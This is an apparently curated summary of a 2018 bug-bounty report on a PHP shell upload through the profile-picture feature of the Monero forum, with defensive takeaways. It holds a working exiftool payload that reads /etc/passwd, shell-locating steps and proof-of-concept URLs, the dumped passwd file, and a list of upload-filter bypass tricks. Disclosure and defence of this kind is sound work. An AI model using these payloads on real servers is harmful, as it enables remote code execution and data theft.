# Arbitrary Shell Upload via Profile Picture - forum.getmonero.org

## Metadata
- **Source:** HackerOne
- **Report:** 357858 | https://hackerone.com/reports/357858
- **Submitted:** 2018-05-26
- **Reporter:** kaulse
- **Program:** Monero Project
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Arbitrary File Upload, Insufficient File Type Validation, Remote Code Execution (RCE), Inadequate MIME Type Checking
- **CVEs:** None
- **Category:** memory-binary

## Summary
The uploadProfile method in UsersController fails to properly validate uploaded files, allowing attackers to upload PHP shells by embedding malicious code in image files and renaming them with .php extensions. The application stores uploaded files in a web-accessible directory without enforcing execution restrictions, enabling direct code execution via HTTP requests.

## Attack scenario
1. Attacker creates or obtains an image file and embeds PHP code using exiftool metadata injection
2. Attacker renames the image file to .php extension to bypass basic extension checks
3. Attacker navigates to profile upload functionality and submits the malicious file
4. Server processes the upload, stores it in /uploads/profile/ directory with a predictable naming scheme using username and timestamp
5. Attacker extracts the timestamp from HTTP response headers and constructs the file path
6. Attacker accesses the uploaded shell via HTTP (e.g., https://forum.getmonero.org/uploads/profile/[USERNAME][TIMESTAMP].php), achieving remote code execution

## Root cause
The application implements no file type validation beyond basic extension checking. It fails to: (1) verify MIME types server-side, (2) strip executable permissions from uploaded files, (3) store uploads outside web root, (4) restrict execution in upload directories via .htaccess or server configuration, and (5) use unpredictable filenames that prevent direct access.

## Attacker mindset
Exploit trust in image file formats and poor validation logic to achieve code execution. Recognize that predictable file paths and web-accessible storage enable direct exploitation. Use metadata injection techniques to hide malicious payloads within seemingly legitimate files.

## Defensive takeaways
- Implement strict whitelist-based file type validation using magic bytes/file signatures, not just extensions
- Verify MIME types server-side and compare against whitelist; never trust client-provided Content-Type headers
- Store uploaded files outside the web root or in non-executable directories
- Configure web server to prevent script execution in upload directories (.htaccess for Apache, server blocks for Nginx)
- Use randomized, unpredictable filenames to prevent direct enumeration and access
- Implement file content inspection/sanitization (re-encode images) to strip embedded code
- Set appropriate file permissions (644) and ownership to prevent execution
- Serve uploaded files through a download handler script rather than direct HTTP access
- Implement rate limiting on upload endpoints to prevent mass exploitation

## Variant hunting
Test other file upload functionalities (avatars, documents, attachments) for identical validation gaps
Check for polyglot file bypass techniques (ZIP+JPG, GIF89a headers with PHP code)
Attempt double extension bypass (.php.jpg, .phtml, .php5, .phar)
Test null byte injection (.php%00.jpg) if legacy PHP versions in use
Check if .htaccess upload is possible to modify server execution rules
.htaccess upload with 'AddType text/plain .jpg' to bypass restrictions
Verify if other user roles (admin, moderator) have additional upload capabilities
Test for directory traversal in filename handling (../../shell.php)

## MITRE ATT&CK
- T1190
- T1190
- T1505.004
- T1571
- T1071

## Notes
Report demonstrates successful exploitation with /etc/passwd disclosure. Server-side timestamp-based naming is predictable and documented in PoC. PHP code execution confirmed. Severity elevated to Critical due to unauthenticated nature (implied) and full RCE capability. The 500 error response still leaks timing information useful for exploitation. Report includes live PoC URLs, indicating active exploitation window before patch.

## Full report
<details><summary>Expand</summary>

**Summary:** 
The method uploadProfile in the UsersController allows an attacker to upload a shell to the target server due to lack of image validation.

**Description:**

## Steps To Reproduce:
  1. Open POC https://forum.getmonero.org/uploads/profile/lNobodyl1527340454.php or https://forum.getmonero.org/uploads/profile/lNobodyl1527341021.php
Or just follow these steps:
1. Find a nice picture and embed the shell into the image like this `exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png`
2. Rename the jpg/png picture to the `.php` extension.
3. Upload the picture.
4. You will get an 500 error page. Ignore it. Grep the time from the response and convert it to a timestamp.
5. Use the timestamp to find your shell: `https://forum.getmonero.org/uploads/profile/[USERNAMAE][timestamp].php`


## Gathered infos:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
bind:x:103:109::/var/cache/bind:/bin/false
ntpd:x:104:110::/var/run/openntpd:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
fluffypony:x:1000:1000:Fluffypony,,,:/home/fluffypony:/bin/bash
postfix:x:106:114::/var/spool/postfix:/bin/false
ossec:x:1001:1001::/var/lib/dome9/ossec:/bin/false
mysql:x:107:116:MySQL Server,,,:/var/lib/mysql:/bin/false
redis:x:108:118:redis server,,,:/var/lib/redis:/bin/false
pollinate:x:109:1::/var/cache/pollinate:/bin/false
gearman:x:110:119:Gearman Job Server,,,:/var/lib/gearman:/bin/false
memcache:x:111:120:Memcached,,,:/nonexistent:/bin/false
debian-tor:x:112:121::/var/lib/tor:/bin/false
systemd-timesync:x:113:123:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:114:124:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:115:125:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:116:126:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:100:101::/run/uuidd:/bin/false
_apt:x:117:65534::/nonexistent:/bin/false
blackfire:x:999:999::/dev/null:
colord:x:118:129:colord colour management daemon,,,:/var/lib/colord:/bin/false
oident:x:119:130::/:/bin/false
```

## Impact

A hacker can hack the server ^^.

</details>

---
*Analysed by Claude on 2026-05-24*
